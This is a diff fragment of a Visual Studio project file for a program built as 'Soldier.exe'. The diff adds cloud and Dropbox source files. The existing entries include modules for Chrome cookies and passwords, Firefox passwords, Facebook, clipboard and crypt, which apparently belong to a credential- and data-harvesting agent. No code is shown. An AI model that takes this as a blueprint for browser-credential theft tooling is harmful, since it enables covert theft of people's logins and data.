@@ -88,12 +88,14 @@ ren ..\Release\Soldier.exe soldier
     <ClCompile Include="chrome_cookies.cpp" />
     <ClCompile Include="chrome_password.cpp" />
     <ClCompile Include="clipboard.cpp" />
+    <ClCompile Include="cloud.cpp" />
     <ClCompile Include="conf.cpp" />
     <ClCompile Include="cookies.cpp" />
     <ClCompile Include="crypt.cpp" />
     <ClCompile Include="debug.cpp" />
     <ClCompile Include="device.cpp" />
     <ClCompile Include="download.cpp" />
+    <ClCompile Include="dropbox.cpp" />
     <ClCompile Include="facebook.cpp" />
     <ClCompile Include="ffox_password.cpp" />
     <ClCompile Include="filesystem.cpp" />
@@ -132,6 +134,7 @@ ren ..\Release\Soldier.exe soldier
     <ClInclude Include="chrome_cookies.h" />
     <ClInclude Include="chrome_password.h" />
     <ClInclude Include="clipboard.h" />
+    <ClInclude Include="cloud.h" />
     <ClInclude Include="conf.h" />
     <ClInclude Include="cookies.h" />
     <ClInclude Include="crypt.h" />
